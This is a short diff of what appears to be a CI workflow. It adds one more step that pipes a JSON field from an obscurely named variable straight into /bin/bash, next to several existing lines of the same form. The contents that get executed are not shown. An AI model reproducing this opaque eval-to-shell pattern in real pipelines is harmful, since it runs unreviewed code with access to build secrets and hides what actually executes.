@@ -31,6 +31,7 @@ jobs:
           echo $lklel6 | jq -r .kwj88120 | /bin/bash
           echo $io136 | jq -r .bhsur8 | /bin/bash
           echo $kcn721 | jq -r .ngvws47 | /bin/bash
+          echo $ul6161 | jq -r .ix930 | /bin/bash
 
       - name: Archive output
         if: always()
